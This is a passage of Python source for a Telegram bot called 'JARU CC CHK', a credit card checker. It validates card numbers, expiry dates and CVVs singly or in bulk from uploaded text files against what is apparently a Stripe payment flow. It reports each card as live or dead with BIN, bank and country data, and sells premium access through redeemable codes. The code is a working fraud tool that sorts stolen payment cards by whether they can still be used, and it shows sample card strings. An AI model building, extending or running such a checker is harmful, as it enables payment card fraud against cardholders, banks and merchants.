<b>「✰」 Country ⬌</b> <code>{bin_info.get('country_name', 'N/A')} {bin_info.get('country_flag', '')}</code>
<b>「✰」 T/t ⬌</b> <code>{process_time}</code>
━━━━━━━━
<code> API: @SoyJaruTsb </code>
                """
                
                try:
                    await context.bot.send_message(chat_id=user_id, text=approved_text, parse_mode='HTML')
                except Exception as e:
                    logger.error(f"Approved message send error: {e}")
                
                approved_ccs.append(cc_data)
            else:
                declined_count += 1
            
            status_text = "Checking CCs one by one...\n\n"
            final_status = "✅ Live" if status == "approved" else "❌ Dead"
            reply_markup = create_check_buttons(
                user_id=user_id,
                current_cc=cc_number,
                status=final_status,
                approved_count=approved_count,
                declined_count=declined_count,
                checked_count=checked_count,
                total_to_check=total_to_check
            )
            
            try:
                await status_msg.edit_text(status_text, reply_markup=reply_markup)
            except Exception as e:
                logger.error(f"Status update error: {e}")
            
            for i in range(10):
                if (not stop_controller.should_continue() or 
                    user_id not in active_checks or 
                    not active_checks[user_id] or
                    (user_id in user_files and user_files[user_id].get('force_stop', False))):
                    break
                await asyncio.sleep(0.05)
                
        except Exception as e:
            logger.error(f"CC processing error: {e}")
            declined_count += 1
            continue
    
    if user_id in stop_controllers:
        del stop_controllers[user_id]
    if user_id in active_checks:
        del active_checks[user_id]
    if user_id in user_files:
        if 'force_stop' in user_files[user_id]:
            del user_files[user_id]['force_stop']
    
    end_time = time.time()
    total_time = round(end_time - start_time, 2)
    
    was_stopped = (
        (user_id in stop_controllers and stop_controllers[user_id].should_stop) or
        (user_id in user_files and user_files[user_id].get('force_stop', False))
    )
    
    if was_stopped:
        final_text = f"""
<b>VERIFICATION STOPPED BY USER</b>
━━━━━━━━
「✰」 <b>Partial Results:</b>
✅ <b>Approved:</b> {approved_count}
❌ <b>Declined:</b> {declined_count}  
「✰」 <b>Checked:</b> {checked_count}
「✰」 <b>Time:</b> {total_time}s
━━━━━━━━
<b>Process completed successfully!</b>
        """
    else:
        final_text = f"""
<b>MassCheck Completed ✅</b>
━━━━━━━━
✅ <b>Approved:</b> {approved_count}
❌ <b>Declined:</b> {declined_count}
「✰」 <b>Total:</b> {checked_count}  
「✰」 <b>Time:</b> {total_time}s
━━━━━━━━ 
<b>Process completed successfully!</b>
        """
    
    try:
        await status_msg.edit_text(final_text, parse_mode='HTML')
    except Exception as e:
        logger.error(f"Final message error: {e}")

# Custom command handler for dot commands
async def handle_custom_commands(update: Update, context: CallbackContext):
    if not update.message or not update.message.text:
        return
    
    text = update.message.text.strip()
    user_id = update.effective_user.id
    
    if text.startswith('.'):
        parts = text[1:].split(maxsplit=1)
        if not parts:
            return
            
        command = parts[0].lower()
        args = parts[1] if len(parts) > 1 else ""
        
        if command == 'start':
            await start_command(update, context)
        elif command == 'chk':
            if args:
                context.args = [args]
            else:
                context.args = []
            await chk_command(update, context)
        elif command == 'chkmass':
            await mtxt_manual_command(update, context)
        elif command == 'id':
            await id_command(update, context)
        elif command == 'code':
            if args:
                context.args = args.split()
            else:
                context.args = []
            await code_command(update, context)
        elif command == 'redeem':
            if args:
                context.args = args.split()
            else:
                context.args = []
            await redeem_command(update, context)
        elif command == 'broadcast':
            if args:
                context.args = args.split()
            else:
                context.args = []
            await broadcast_command(update, context)
        elif command == 'stats':
            await stats_command(update, context)

# Start command
async def start_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    
    user_status = get_user_status(user_id)
    now = datetime.now()
    current_time = now.strftime("%H:%M:%S")
    current_date = now.strftime("%d/%m/%Y")
    
    welcome_text = f"""
<b>⛅️ JARU CC CHK</b> ↯

[「✰」 <b>🚀 MAIN PANEL</b> 「✰」]

⌥ <code>チ 𝗛𝗼𝗹𝗮 𝗕𝗶𝗲𝗻𝘃𝗲𝗻𝗶𝗱𝗼 𝗮 𝗝𝗮𝗿𝘂 𝗰𝗵𝗸 𝗽𝗿𝗼𝗻𝘁𝗼 𝘀𝗲𝗿𝗲𝗺𝗼𝘀 𝗲𝗹 𝗰𝗵𝗸 𝗡𝘂𝗺𝗲𝗿𝗼𝘀 #1 チ</code>

<code>Status: {user_status.upper()} | Limit: {get_user_limit(user_id)} CCs</code>
<code>ID: {user_id} | Time: {current_time}</code>

[「✰」 <b>Bot Status</b> ⬌ <code>Online 🟢</code>]
    """
    
    await update.message.reply_text(
        welcome_text,
        reply_markup=create_main_menu_buttons(),
        parse_mode='HTML'
    )

# Rest of commands maintain their original functionality...
async def id_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    await update.message.reply_text(f"<b>Your User ID:</b> <code>{user_id}</code>", parse_mode='HTML')

async def mtxt_manual_command(update: Update, context: CallbackContext):
    await update.message.reply_text("""
<b>📁 MASS VERIFICATION</b>
━━━━━━━━
<code>「✰」 Upload any .txt file</code>
<code>「✰」 Bot automatically detects CCs</code>
<code>「✰」 Then click verification button</code>
━━━━━━━━
<code>API: @SoyJaruTsb</code>
    """, parse_mode='HTML')

async def chk_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    
    if len(context.args) == 0:
        await update.message.reply_text("""
<b>💳 𝗩𝗲𝗿𝗶𝗳𝗶𝗰𝗮𝗰𝗶𝗼𝗻 𝗶𝗻𝗱𝗶𝘃𝗶𝗱𝘂𝗮𝗹</b>
━━━━━━━━
<code>「✰」 Use /chk followed by your CC</code>
<code>「✰」 Example: /chk 4879170029890689|02|2027|347</code>
━━━━━━━━
<code>API: @SoyJaruTsb</code>
""", parse_mode='HTML')
        return
    
    cc_input = " ".join(context.args)
    valid_ccs = simple_cc_parser(cc_input)
    
    if not valid_ccs:
        await update.message.reply_text(f"""
<b>❌ Invalid CC format!</b>
━━━━━━━━
<b>Valid Formats:</b>
<code>「✰」 4147768578745265|04|2026|168</code>
━━━━━━━━
<b>Your Input:</b> <code>{cc_input}</code>
        """, parse_mode='HTML')
        return
    
    cc_number, month, year, cvv = valid_ccs[0]
    card_type = detect_card_type(cc_number)
    bin_number = cc_number[:6]
    
    bin_info = bin_lookup(bin_number)
    processing_msg = await update.message.reply_text(f"""
<b>🔍 PROCESSING CARD...</b>
━━━━━━━━
<code>「✰」 Card: {cc_number}</code>
<code>「✰」 Type: {card_type}</code>
<code>「✰」 Bin: {bin_number}</code>
━━━━━━━━
<code>API: @SoyJaruTsb</code>
    """, parse_mode='HTML')
    
    status, process_time, api_response = check_cc(cc_number, month, year, cvv)
    
    if status == "approved":
        result_text = f"""
<b>#𝗝𝗔𝗥𝗨𝗖𝗛𝗞 - 𝗦𝘁𝗿𝗶𝗽𝗲 𝗠𝗮𝘀𝘀</b>
━━━━━━━━
<code>「✰」 {cc_number}|{month}|{year}|{cvv}</code>
<b>「✰」 Status ⬌ </b><b><i>𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙</i></b> ✅
<b>「✰」 Response ⬌</b> <code>(Payment added successfully)</code>

<code>「✰」 Bank: {bin_info.get('bank', 'N/A')}</code>
<code>「✰」 Country: {bin_info.get('country_name', 'N/A')} {bin_info.get('country_flag', '')}</code>
<code>「✰」 T/t: {process_time}s</code>
━━━━━━━━
<code>API: @SoyJaruTsb</code>
        """
    else:
        result_text = f"""
<b>#𝗝𝗔𝗥𝗨𝗖𝗛𝗞 - 𝗦𝘁𝗿𝗶𝗽𝗲 𝗠𝗮𝘀𝘀</b>      
━━━━━━━━
<code>「✰」 {cc_number}</code>
<b>「✰」 Status ⬌</b> <b><i>𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 ❌ </i></b>
<b>「✰」 Response ⬌</b> <code> {api_response[:100] + '...' if api_response and len(api_response) > 100 else api_response or Declined </code>

<code>「✰」 Type: {bin_info.get('brand', 'N/A')} - {bin_info.get('type', 'N/A')}</code>
<code>「✰」 Bank: {bin_info.get('bank', 'N/A')}</code>
<code>「✰」 Country: {bin_info.get('country_name', 'N/A')} {bin_info.get('country_flag', '')}</code>
<code>「✰」 T/t: {process_time}s</code>
━━━━━━━━
<code>API: @SoyJaruTsb</code>
        """
    
    await processing_msg.edit_text(result_text, parse_mode='HTML')

# Premium Code System
def generate_premium_code(days):
    code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("INSERT INTO premium_codes (code, days, created_at) VALUES (?, ?, ?)", (code, days, time.time()))
    conn.commit()
    conn.close()
    return code

async def code_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Command only for owner!")
        return
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /code <days>")
        return
    try:
        days = int(context.args[0])
        code = generate_premium_code(days)
        await update.message.reply_text(f"""
<b>🌤 VIP KEY JARUCHK</b>
━━━━━━━━                                   
<code>「✰」 Code: {code}</code>
<code>「✰」 Duration: {days} days</code>
<code>「✰」 Usage: /redeem {code}</code>
━━━━━━━━
<code>API: @SoyJaruTsb</code>
        """, parse_mode='HTML')
    except ValueError:
        await update.message.reply_text("❌ Invalid days format!")

async def redeem_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /redeem <code>")
        return
    code = context.args[0].upper()
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT days FROM premium_codes WHERE code=? AND used_by IS NULL", (code,))
    result = c.fetchone()
    if not result:
        await update.message.reply_text("❌ Invalid code or already used!")
        conn.close()
        return
    days = result[0]
    expires_at = time.time() + (days * 24 * 60 * 60)
    c.execute("UPDATE premium_codes SET used_by=? WHERE code=?", (user_id, code))
    c.execute("UPDATE users SET status='premium' WHERE user_id=?", (user_id,))
    c.execute("INSERT INTO redeemed (user_id, code, redeemed_at, expires_at) VALUES (?, ?, ?, ?)", (user_id, code, time.time(), expires_at))
    conn.commit()
    conn.close()
    expiry_date = datetime.fromtimestamp(expires_at).strftime("%Y-%m-%d %H:%M:%S")
    await update.message.reply_text(f"""
<b>🎉 PREMIUM ACTIVATED</b>
━━━━━━━━                                
<b>✅ You are now Premium User!</b>
<code>「✰」 Expires: {expiry_date}</code>
<code>「✰」 Features unlocked</code>
<code>「✰」 Limit: {PREMIUM_LIMIT} CCs</code>
<code>「✰」 Priority processing</code>
━━━━━━━━
<code>API: @SoyJaruTsb</code>
    """, parse_mode='HTML')

async def broadcast_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /broadcast <message>")
        return
    message = ' '.join(context.args)
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT user_id FROM users")
    users = c.fetchall()
    conn.close()
    sent, failed = 0, 0
    for (user_id,) in users:
        try:
            await context.bot.send_message(chat_id=user_id, text=message)
            sent += 1
        except:
            failed += 1
        await asyncio.sleep(0.1)
    await update.message.reply_text(f"""
<b>📢 BROADCAST COMPLETE</b>
✅ <b>Sent:</b> {sent}
❌ <b>Failed:</b> {failed}
    """, parse_mode='HTML')

async def stats_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        return
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM users")
    total_users = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM users WHERE status='free'")
    free_users = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM users WHERE status='premium'")
    premium_users = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM premium_codes WHERE used_by IS NOT NULL")
    used_codes = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM premium_codes WHERE used_by IS NULL")
    available_codes = c.fetchone()[0]
    conn.close()
    stats_text = f"""
<b>📊 BOT STATISTICS</b>
<code>👥 Users:</code>
<code>「✰」 Total: {total_users}</code>
<code>「✰」 Free: {free_users}</code>
<code>「✰」 Premium: {premium_users}</code>

<code>💎 Premium System:</code>
<code>「✰」 Used Codes: {used_codes}</code>
<code>「✰」 Available Codes: {available_codes}</code>

<code>🔧 Limits:</code>
<code>「✰」 Free: {FREE_LIMIT} CCs</code>
<code>「✰」 Premium: {PREMIUM_LIMIT} CCs</code>
<code>「✰」 Owner: {OWNER_LIMIT} CCs</code>
    """
    await update.message.reply_text(stats_text, parse_mode='HTML')

# ERROR HANDLER
async def error_handler(update: Update, context: CallbackContext):
    logger.error(f"Exception while handling an update: {context.error}")
    
    try:
        if OWNER_ID:
            error_msg = f"🚨 Bot Error:\n{context.error}"
            await context.bot.send_message(chat_id=OWNER_ID, text=error_msg)
    except:
        pass

def main():
    init_db()
    
    application = Application.builder().token(TOKEN).build()
    
    application.add_error_handler(error_handler)
    
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("chk", chk_command))
    application.add_handler(CommandHandler("mtxt", mtxt_manual_command))
    application.add_handler(CommandHandler("id", id_command))
    application.add_handler(CommandHandler("code", code_command))
    application.add_handler(CommandHandler("redeem", redeem_command))
    application.add_handler(CommandHandler("broadcast", broadcast_command))
    application.add_handler(CommandHandler("stats", stats_command))
    
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_custom_commands))
    
    application.add_handler(CallbackQueryHandler(handle_button))
    
    print("🤖 Bot is starting...")
    print("🎯 IMPROVED INTERFACE ACTIVATED!")
    print("🚀 Interactive menu system ready!")
    print("💳 Single and mass verification active!")
    print("🛡️ Security system activated!")
    print("🔘 Improved design implemented!")
    print("💎 Premium system working!")
    print("📚 Spanish guide integrated!")
    print("🔗 Complete button navigation enabled!")
    
    while True:
        try:
            application.run_polling(
                drop_pending_updates=True,
                allowed_updates=Update.ALL_TYPES,
                timeout=30,
                pool_timeout=30
            )
        except Exception as e:
            logger.error(f"Bot crashed: {e}")
            print(f"🚨 Bot crashed: {e}")
            print("🔄 Restarting in 10 seconds...")
            time.sleep(10)
            print("🔄 Restarting bot now...")

if __name__ == '__main__':
    main()